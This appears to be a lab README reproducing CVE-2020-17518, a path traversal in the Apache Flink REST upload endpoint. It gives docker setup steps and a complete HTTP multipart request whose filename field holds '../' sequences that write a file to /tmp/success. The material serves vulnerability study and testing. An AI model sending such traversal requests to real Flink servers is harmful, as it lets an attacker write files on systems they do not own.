# Apache Flink Upload Path Traversal (CVE-2020-17518)

[中文版本(Chinese version)](README.zh-cn.md)

Apache Flink is an open source stream processing framework with powerful stream- and batch-processing capabilities.

A vulnerability in Apache Flink 1.5.1 and later versions allows attackers to write uploaded files to arbitrary locations on the local file system through a maliciously crafted HTTP header in the REST API request. This issue is fixed in Apache Flink 1.11.3.

References:

- <https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4>
- <https://nvd.nist.gov/vuln/detail/CVE-2020-17518>

## Environment Setup

Execute the following command to start an Apache Flink jobmanager 1.11.2:

```
docker compose up -d
```

After the Apache Flink service is started, visit `http://your-ip:8081` to access the management interface.

## Vulnerability Reproduction

Send the following HTTP request to upload a file to `/tmp/success` on the target server:

```
POST /jars/upload HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Length: 187

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/success"

success
------WebKitFormBoundaryoZ8meKnrrso89R6Y--
```

After the file is uploaded, you can check the `/tmp/success` file on the target server:

![](1.png)
